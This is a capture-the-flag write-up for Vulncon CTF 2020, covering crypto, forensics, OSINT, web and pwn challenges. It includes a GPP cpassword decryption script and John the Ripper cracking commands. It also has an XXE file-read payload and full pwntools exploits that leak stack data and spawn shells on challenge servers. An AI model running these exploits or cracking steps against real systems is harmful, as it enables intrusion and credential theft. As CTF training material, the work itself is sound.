

# CRYPTO

## DOUBLE

![soln](img/twin_hex.png)

## can_you_c_the_password


path in /Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from base64 import b64decode

def decrypt(cpassword): 
    # Key from MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
    key = bytes.fromhex("4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")
    
    cpassword += "=" * ((4 - len(cpassword) % 4) % 4)
    password = b64decode(cpassword)
    
    iv = b'\0' * 16
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(password), 16).decode('utf16')
 
print(decrypt('HlQWFdlPXQTU7n8W9VbsVTP245DcAJAUQeAZZfkJE/Q8ZlWgwj7CqKl6YiPvKbQFO7PWS7rSwbVtSSZUhJSj5YzjbkKtyXR5fP9VQDEieMU'))
```


## PollMor

![soln](img/pollux.png)

## Go_on_a_date?

![morse](img/morse.png)

![date](img/date.png)


```python
from string import ascii_lowercase


a="ddve uhkft fkpjet enfqdknis"


date="03202020"
#date+=str(m).zfill(2)+str(n).zfill(2)+str(o).zfill(2)
#print(date)
cip=""
cn=0
for i in range(len(a)):
	if a[i] in ascii_lowercase:
		cip+=chr((ord(a[i])-97-int(date[(i-cn)%8]))%26+97)
	else:
		cip+=a[i]
		cn+=1

print(cip)
```

## diffrent_but_similar

```python
#!/usr/bin/env sage

from public_key import e, n
#from secret import secret
from string import *
secret=ascii_lowercase+ascii_uppercase+digits+"_!?@#$ %\"\'\\/+-*<>:;=.,}{[]()|~"

from binascii import hexlify
from sage.all import GF, PolynomialRing
from Crypto.Util.number import long_to_bytes, bytes_to_long

P=PolynomialRing(GF(2),'x')
n_poly = P(n)
R.<a> = GF(2^2049)

ciphertext = b''


MAP={}
for idx in secret:
    idx_int = bytes_to_long(idx.encode())
    idx_poly = P(R.fetch_int(idx_int))
    c_idx_poly = pow(idx_poly, e, n_poly)
    c_idx_int = R(c_idx_poly).integer_representation()
    #print(c_idx_int)
    MAP[idx]=long_to_bytes(c_idx_int)
    #print(len(MAP[idx]))

#print(MAP)

cip=open('secret', 'rb').read()

for i in range(0,len(cip),259):
	a=cip[i:i+256]
	c=0
	for j in MAP:
		if MAP[j]==a:
			c=1
			print(j,end='')
	if c==0:
		print("NO")
```

`vulncon{man1@C_L!k35_s@g3}`

## is_it_magic?

XOR WITH `FF D8 FF E0 00 10 4A 46 49 46 00 01`  get hex key from first 32 chars

then xor whole thing with that key

you get a jpg file


run binwalk on it

you get another image, it has the flag

![magic](img/bb.jpg)



# MISCELLANEOUS

## JOHNNY

wordlist
```
John37@Ripper@Cracker
John37@Ripper@Cracker
John37@Cracker@Ripper
John@Cracker@Riper
John@Ripper@37
John@Ripper@Cracker@37
John37@Ripper
John37@Cracker@Ripper
John
John37
John@Cracker
```

`/usr/sbin/keepass2john confidential.kbdx > hahs`
`john hahs  -w=/usr/share/wordlists/rockyou.txt`

`└─# john --show hahs                              
Confidential:John37@Cracker@Ripper`

`vulncon{Programming_Is_Necessary_For_Cyber_Right?}`


## Number Magic

code
```python
R1 = [25, 36, 49, 64, 81, 100, 121, 144, 169, 196, 225, 256, 289, 324, 361, 400, 441, 484, 529, 576, 625]

c=1
ans=f"R1:{R1}"
while (len(R1)>1):
    b=[]
    for i in range(1,len(R1)):
        a=sum([int(j) for j in str(R1[i-1])])+sum([int(j) for j in str(R1[i])])
        b.append(a)

    R1=b
    print(b)
    c+=1
    ans+="\n"+f"R{c}:{R1}"

print(ans)
```

pattern
```
R1:[25, 36, 49, 64, 81, 100, 121, 144, 169, 196, 225, 256, 289, 324, 361, 400, 441, 484, 529, 576, 625]
R2:[16, 22, 23, 19, 10, 5, 13, 25, 32, 25, 22, 32, 28, 19, 14, 13, 25, 32, 34, 31]
R3:[11, 9, 15, 11, 6, 9, 11, 12, 12, 11, 9, 15, 20, 15, 9, 11, 12, 12, 11]
R4:[11, 15, 8, 8, 15, 11, 5, 6, 5, 11, 15, 8, 8, 15, 11, 5, 6, 5]
R5:[8, 14, 16, 14, 8, 7, 11, 11, 7, 8, 14, 16, 14, 8, 7, 11, 11]
R6:[13, 12, 12, 13, 15, 9, 4, 9, 15, 13, 12, 12, 13, 15, 9, 4]
R7:[7, 6, 7, 10, 15, 13, 13, 15, 10, 7, 6, 7, 10, 15, 13]
R8:[13, 13, 8, 7, 10, 8, 10, 7, 8, 13, 13, 8, 7, 10]
R9:[8, 12, 15, 8, 9, 9, 8, 15, 12, 8, 12, 15, 8]
R10:[11, 9, 14, 17, 18, 17, 14, 9, 11, 11, 9, 14]
R11:[11, 14, 13, 17, 17, 13, 14, 11, 4, 11, 14]
R12:[7, 9, 12, 16, 12, 9, 7, 6, 6, 7]
R13:[16, 12, 10, 10, 12, 16, 13, 12, 13]
R14:[10, 4, 2, 4, 10, 11, 7, 7]
R15:[5, 6, 6, 5, 3, 9, 14]
R16:[11, 12, 11, 8, 12, 14]
R17:[5, 5, 10, 11, 8]
R18:[10, 6, 3, 10]
R19:[7, 9, 4]
R20:[16, 13]
R21:[11]
```

## All I know was ZIp

with open("file.txt",'r') as f:
    file = f.readlines()

file=map(lambda x:x.strip(),file) #remove \n
file=''.join(file)
file=file.split(',') # one line
file=map(lambda x:int(x,16).to_bytes(1,'big'),file) # 0x50 -> bytes

with open("file.zip","wb") as f:
    f.write(b''.join(file))

import zipfile
with zipfile.ZipFile("file.zip", 'r') as zip_ref:
    zip_ref.extractall(".")

pdf2john encrypted.pdf > hahs

john hahs -w=/sur/share/wordlists/rockyou.txt

pdf password: butterfly
![dragon](img/dragon.png)

then draconic cipher from dcode.fr

https://www.dcode.fr/draconic-dragon-language

## TIGER

steghide password:tiger
![roar](img/tiger1.png)

![bhauuu](img/tiger2.png)

![devi](img/tiger3.png)

![sadia](img/tiger4.png)

![zala](img/tiger5.png)


## AUDIO

```
┌──(root💀Masrt)-[~/…/Ctfs/VVV/Miscellaneous/Audio]
└─# stegolsb wavsteg -r -i audio.wav -o aa.txt -n 1 -b 1024
Files read                     in 0.04s
Recovered 1024 bytes           in 0.00s
Written output file            in 0.00s
                                                                                                                      
┌──(root💀Masrt)-[~/…/Ctfs/VVV/Miscellaneous/Audio]
└─# cat aa.txt             
https://mega.nz/file/7oYC0RzZ#YlDr9jiF7tL8lhLdXpc8hOen21fhm8DoaOoNaeUWbTw####################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################### 
```

file.zip from mega link
unzip file.zip

```bash
└─#  /usr/share/john/encfs2john.py file/ > hahs
                                                                                                                      
┌──(root💀Masrt)-[~/…/Ctfs/VVV/Miscellaneous/Audio]
└─# john hahs  -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (EncFS [PBKDF2-SHA1 256/256 AVX2 8x AES])
Cost 1 (iteration count) is 2001741 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sarah            (file/)
1g 0:00:02:28 DONE (2020-12-20 05:34) 0.006720g/s 2.096p/s 2.096c/s 2.096C/s adidas..alicia
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

![encfs](img/encfs.png)

![grep](img/grep_baby.png)

## PCAPED

each TCP stream has one character of a base64 encoded string, decoing it gave the flag


## TELEVISION

first join all wav files using ffmpeg
then play and run robots36  sstv

![flag](img/sstv.png)


## twerk_it_all

resize into 1000x1000 using tweak png gui tool

![mffa](img/twerk.png)

# VULCON2020

## Sanity Check

![bsrk](img/san1.png)

![mdrchd](img/san2.png)


## Noob-bot


.about

![aout](img/about.png)

got to welcome.noobarmy.org

play stupid game

get nc address

![bot](img/bot.png)

then get flag


# MEMORY FORENSICS

## GAME OVER

![overrr](img/game.png)

## USB-DEVICE

![dev](img/usb.png)

## PHISY EMAIL

![email](img/email.png)


# OSINT

# find the coin

Whale Alert
@whale_alert  --> twitter after simple google searches

https://t.co/yAF7ocDUrQ?amp=1

https://whale-alert.io/transaction/ethereum/fdef5b6f6dece6b29695b9fd8d0cadaff944876e598fd443125e1f8c2db15160


## FLYING BEAR

![bear](img/bear.png)

`http://antonakis.co.uk/registers/unitedstatesofamerica/20180103.txt`


![fly](img/fly.png)

`vulncon{PO_BOX_699_ROSE_HILL_NC_284580699}`


## WATCHED

![aaaa](img/w1.png)

![aaaa](img/w2.png)

![aaaa](img/w3.png)

![aaaa](img/w4.png)

![aaaa](img/w5.png)

![aaaa](img/w6.png)

![aaaa](img/w7.png)

![aaaa](img/w8.png)

![aaaa](img/w9.png)

![aaaa](img/w10.png)


## TROUVER

![bay](img/bay.png)


## SUDO GF

```
sabia linkedin https://www.linkedin.com/in/sabia-zana-2082a4201/

`there to sabia at github --> https://github.com/0x9710sabia`

her gists has a pgp public key,,,

importing that and searching the key id in keybase gives her keybase account -->https://keybase.io/sabiaafk

`
sabiaafk
Sabia Zana
I am Software Engineer at Avratra My Boss asked me to paste this to my keybase Bio: YTrc68ub He said, Someone, will come looking for it :)
NY `

from there we get pastebin link --> https://pastebin.com/YTrc68ub

pastebin password in wiki of sabia's public gist repo

```


# FORENSICS


## Vera ki bakchodi (BY NAUGHTB0Y AGAR ACHA LGA HO TOH CONTACT KRE)

extract karne ke baad ka aatank

![sera](img/v1.png)

sqlite main bhayanak dhrushya
dhyan dena **places.sqlite** db aur **moz_places** main tumhari porn history bhi ho sakti hain savdhan rhe satark rhe


![sera](img/v2.png)


apko dikhega ki kaafi ninda ki gyi pastebin ki aur fir dusre alternative main pass chupa diya gya

![sera](img/v3.png)


ab aage badhoge toh apna saara kala dhan chupane ke liye encryption tool dekh rha tha user , *sus*

![sera](img/v4.png)

launchpad wala veracrypt ka download link  hain 


aur bas ab ek aur part fir sabka mahagathbandhan

mega ka links bhi dekhne mila toh 2 main password mang rha tha aur woh guess na hua hamse toh 3rd wala link khole

![sera](img/v5.png)

udhar ek file mila ,uske saath bohot upar niche kiya kuch samjh nahi aaya

fir akhir main chamka ki yeh tino ka combination hi ab kuch kaam ayega

toh bas veracrypt main password ke saath kiya tapatap

![sera](img/v6.png)


## FORENSICS SERIES


![flag](img/f1.png)

vulncon{ip_bruteforce}

![flag](img/f2.png)

[github linpeas link]

![flag](img/f3.png)

![flag](img/f4.png)

![flag](img/f5.png)


## PUNISHMENT

convert text to .zip file
get the docx file

```powershell
Recycle bin path: 'D:\LXShare\$I4A67FE.docx'
Version: 2
OS Guess: Windows 10 or above
Time zone: Coordinated Universal Time (UTC) [+0000]

Index   Deleted Time    Size    Path
$I4A67FE.docx   2020-11-04 21:01:14     6149    C:\Users\Noobarmy\Desktop\vulncon.docx
```


## USB BRUH

first use `usbrip events histroy -f sys.log` to get usb histpry data

save as .json file then compare with manf-.json

```python
import json

f=open('manf-details.json')
details=json.load(f)

manf={}
prod={}
serial={}

for i in details:
	c=0
	print(i)
	for j in details[i]:
		if i=="manufact":
			manf[j]=c
			c+=1
		elif i=="prod":
			prod[j]=c
			c+=1
		elif i=="serial":
			serial[j]=c
			c+=1

print(len(manf),len(prod),len(serial))

fp=open("history.json")

usb=json.load(fp)

for i in range(len(usb)):
	a=usb[i]["manufact"]
	b=usb[i]["prod"]
	c=usb[i]["serial"]
	if a not in manf:
		print("maufact:",a)
	if b not in prod:
		print("prof:",b)
	if c not in serial:
		print("serial:",c)
		#print("manf:",a)
		#print("prod:",b)
```
you get three 32 length hex strings
md5 crack them and get flag

vulncon{my_computer_dead}


# ALL REV + UNKNOWN BACKDOOR(MEM FORENSICS) + (OBSCUURE_UNDERGROUND) (WEB)

https://docs.google.com/document/d/1eltfUKirPv7OKGfkhPsDu-aWdLgEPh9Px1hv9e4pJKo/edit



# WEB

## quick CMS

https://dmcr7.github.io/posts/writeup-web-vulncon-ctf-2020-quick-cms/

## swigger

https://dmcr7.github.io/posts/writeup-web-vulncon-ctf-2020-swigger/


## mr hecker

![xxe](img/xxe.png)


payload
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///home/hekker/flag.txt">
]>
<contact>
  <name>hekker</name>
  <email>naughtyb0y@amazon.com</email>
  <subject>pwned</subject>
  <message>&ent;</message>
</contact>
```

## maze

download all files from 0 to 27:
tou get clue of file 13

http://maze.noobarmy.org/projects/justsomerandomfoldername/image-13.png

exiftool-> base64 -d --> rot13


# PWN

## name
https://dmcr7.github.io/posts/writeup-pwn-vulncon-ctf-2020-name/

## the good_old_time
https://dmcr7.github.io/posts/writeup-pwn-vulncon-ctf-2020-the-good-old-time/

## warmup 

This was obvious ret2win function, since it had a function named `overflowed` which, once called, return the shell, then using the `gdb` we find the offset to the RIP was 24, then using pwntools, we get the shell and the flag:-

> Since the remote system was the Ubuntu 18.04 or higher, using a `ret` we aligned the payload and profit.

```py

from pwn import *

p = remote("35.232.11.215", 49153)
elf = ELF("w4rmup")

payload = b"A"*24
payload += p64(0x0000000000401016)
payload += p64(elf.symbols['overflowed'])

p.sendline(payload)
p.interactive()

```
Running it:-

```r
~/Pwning/CTFs/Bsides/reverse $ python3 xpl.py 
[+] Opening connection to 35.232.11.215 on port 49153: Done
[*] '/home/d4mianwayne/Pwning/CTFs/Bsides/reverse/w4rmup'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Switching to interactive mode
-1964922237
$ ls
check
flag
run.sh
ynetd
$ cat flag
vulncon{y0u_4re_all_s3t_for_pwn}
$ 
[*] Interrupted
~/Pwning/CTFs/Bsides/reverse $ 
```

## nobin

This challenge was the blind format string challenge which can be deduced by giving the `%p` to the remote server and the response was an arbitrary address from the binary of the server side. Since, judging from the output of the fuzzing parameter i.e. `%p%p%p%p`, so using the following leaker, I leaked the binary up until to the `text` segment.

```py
import binascii

RPORT = 49156

from pwn import *



base = 0x400000
leaked = ""

while 1:
    chal = remote("34.91.74.119", RPORT)
    addr = p64(base+len(leaked))
    if "\n" in addr:
        leaked += "\0"
        print("derp")
        continue
    chal.sendline("A"*6 + "%8$s" + "B"*6 + addr)
    chal.recvuntil("A"*6)
    leak = chal.recvuntil("B"*6)[:-6]
    leaked += leak + "\0"
    chal.close()
    print(leak)
    log.info("Length:  %d" %(len(leaked)))
    l = open("leak.bin", "wb")
    l.write(leaked)
    l.close()
```
Analysing the `leaks.bin` with `r2` we can see there is an another function which spawns a shell if the global address `0x601068` is equal to the `0x1337`, so following exploit was used:;-

```py
from roppy import *

context.arch = "amd64"


p = remote("34.91.74.119", 49156)
payload = fmtstr64(6, {0x00601048: 0x00400670})

p.sendline(payload)
p.recv()
payload = fmtstr64(6, {0x0060108c: 0x1337})
p.sendline(payload)
p.recv()
payload = fmtstr64(6, {0x00601048: 0x0040081a})
p.sendline(payload)
p.interactive()
```

Resulting in:-

```r
$ cat flag
vulncon{th4nk_y0u_%s_f0r_l34k}
```

## loopinig

From the reverse engineering, we see that the binary takes the input with `read` and prints the content with the `puts`, since it is not null terminated, we can give a certain amount of bytes and leak stack contents, using that we get the PIE address and the canary, then ret2libc:-

```py
from pwn import *

p = remote("35.232.11.215", 49154)
elf = ELF("looping")
libc = ELF("libc.so.6")
p.send("A"*73)
p.recvuntil("A"*73)
canary = int("0x" + hex(u64(p.recv(8).strip()))[4:] + "00", 16)

elf.address =  int(hex(u64(p.recv(8).strip().ljust(8, b"\x00"))) + "90", 16) - 0x990
print(hex(canary))

print(hex(elf.address))

pop_rdi = elf.address + 0x00000000000009f3

payload = cyclic(72)
payload += p64(canary)
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.address + 0x88a)
p.sendline(payload)
p.recvline()
p.recvline()
p.recvline()
libc.address = u64(p.recv(6).ljust(8, b"\x00")) - libc.symbols['puts']
print(hex(libc.address))

p.sendline("")
payload = cyclic(72)
payload += p64(canary)
payload += p64(0)
payload += p64(libc.address + 0x4f3d5)
p.send(payload)
p.interactive()
```

## where_to_go

This binary had the obvious stack overflow vulnerabiltiy with the `NX` and `PIE` enabled, so there was this following function which gives us the address of the `main` function and call the `main` again, since the PIE is enabled, we can just do partial overwrite of the `ret` to call the following function and then we can do obvious re2libc:-

```r
[0x000006d0]> pdf @fcn.00000899
/ 67: fcn.00000899 ();
|           ; var int64_t var_10h @ rbp-0x10
|           ; var int64_t var_8h @ rbp-0x8
|           0x00000899      55             push rbp
|           0x0000089a      4889e5         mov rbp, rsp
|           0x0000089d      4883ec10       sub rsp, 0x10
|           0x000008a1      488d0532ffff.  lea rax, qword [main]       ; 0x7da
|           0x000008a8      488945f0       mov qword [var_10h], rax
|           0x000008ac      488d45f0       lea rax, qword [var_10h]
|           0x000008b0      488945f8       mov qword [var_8h], rax
|           0x000008b4      488b45f8       mov rax, qword [var_8h]
|           0x000008b8      ba06000000     mov edx, 6
|           0x000008bd      4889c6         mov rsi, rax
|           0x000008c0      bf01000000     mov edi, 1
|           0x000008c5      b800000000     mov eax, 0
|           0x000008ca      e8b1fdffff     call sym.imp.write          ; ssize_t write(int fd, const char *ptr, size_t nbytes)
|           0x000008cf      b800000000     mov eax, 0
|           0x000008d4      e801ffffff     call main                   ; int main(int argc, char **argv, char **envp)
|           0x000008d9      90             nop
|           0x000008da      c9             leave
\           0x000008db      c3             ret

```

The exploit:-

```py
from pwn import *

p = remote("35.232.11.215", 49155)
elf = ELF("where_to_go")
libc = ELF("libc6_2.27-3ubuntu1.4_amd64.so")
payload = b"A"*40
payload += b"\x99"
pause()
p.recvline()
p.send(payload)
elf.address = u64(p.recv(6).ljust(8, b"\x00")) - 0x7da

mov = elf.address + 0x920
pop_rdi = elf.address + 0x943
pop_rsi = elf.address + 0x941
payload = b"A"*40
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(elf.got['write'])
payload += p64(0)
payload += p64(elf.plt['write'])
payload += p64(elf.address + 0x7da)
pause()
p.send(payload)
p.recvline()
libc.address = u64(p.recv(6).ljust(8, b"\x00")) - libc.symbols['write']
print(hex(libc.address))

payload = b"A"*40
payload += p64(elf.address + 0x0000000000000288)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(libc.symbols['system'])
p.send(payload)
p.interactive()
```                    